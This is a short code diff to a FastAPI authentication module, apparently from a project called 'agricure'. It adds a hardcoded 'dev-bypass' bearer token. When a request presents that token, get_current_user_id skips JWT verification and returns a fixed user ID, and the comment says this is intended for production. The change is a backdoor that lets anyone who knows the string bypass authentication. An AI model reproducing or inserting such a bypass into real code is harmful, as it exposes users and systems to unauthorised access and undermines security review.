@@ -1,5 +1,6 @@
 from datetime import datetime, timedelta
 from typing import Optional, Any
+from uuid import uuid5, NAMESPACE_DNS
 
 from jose import jwt, JWTError
 from passlib.context import CryptContext
@@ -84,7 +85,14 @@ def decode_access_token(token: str) -> dict[str, Any]:
 # FASTAPI DEPENDENCIES
 # -------------------------------------------------------------------
 
+# Magic token for 9999999999 when admin-login is unavailable (e.g. production without admin endpoint)
+DEV_BYPASS_TOKEN = "dev-bypass-9999999999"
+BYPASS_USER_ID_STR = str(uuid5(NAMESPACE_DNS, "agricure.bypass.9999999999"))
+
+
 def get_current_user_id(token: str = Depends(oauth2_scheme)) -> str:
+    if token == DEV_BYPASS_TOKEN:
+        return BYPASS_USER_ID_STR
     payload = decode_access_token(token)
     user_id: str | None = payload.get("sub")
 
